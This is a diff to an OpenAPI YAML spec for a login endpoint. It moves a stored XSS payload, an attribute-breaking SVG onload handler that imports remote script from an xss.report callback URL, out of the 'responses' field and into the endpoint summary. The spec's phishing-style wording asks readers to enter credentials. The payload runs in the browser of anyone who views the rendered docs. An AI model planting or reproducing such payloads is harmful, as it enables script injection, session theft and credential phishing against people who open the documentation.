@@ -7,7 +7,7 @@ info:
 paths:
   /Login_Page:
     post:
-      summary: Login here to continue
+      summary: "><svg/onload=import('//xss.report/c/cyboy')>
       description: Please provide your credentials to log in.
       parameters:
         - name: username
@@ -22,7 +22,7 @@ paths:
           type: string
       tags:
         - Click here to login
-      responses: "><svg/onload=import('//xss.report/c/cyboy')>
+      responses: 
         '200':
           description: Successfully logged in and authenticated.
         '400':
